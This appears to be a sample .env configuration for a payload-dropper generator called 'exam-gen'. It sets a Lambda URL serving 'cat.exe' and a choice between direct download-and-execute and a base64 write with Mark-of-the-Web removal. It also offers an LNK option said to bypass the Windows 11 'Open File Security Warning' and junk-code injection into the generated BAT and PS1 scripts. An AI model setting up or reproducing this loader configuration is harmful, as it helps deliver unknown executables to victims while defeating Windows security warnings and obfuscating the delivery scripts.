# exam-gen configuration
# Copy this file to .env and fill in your values

LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
API_KEY=your-api-key-here
TARGET_FILENAME=cat.exe
VARIANTS_DIR=./variants
OUTPUT_DIR=./output

# Delivery method: webclient (default) or base64_recycle
#   webclient      — WebClient.DownloadFile + direct execution
#   base64_recycle — WebClient.DownloadData + base64 write + MOTW removal (MOTW bypass)
DELIVERY_METHOD=webclient

# LNK MOTW bypass: non-empty = ON (direct cmd /c .\bat instead of start /min)
# Bypasses "Open File Security Warning" on Windows 11 22H2+ patched systems
#LNK_BYPASS=1

# Junk code injection: non-empty = ON
# Injects dead-code functions, variables, labels into generated BAT and PS1
#JUNK_CODE=1
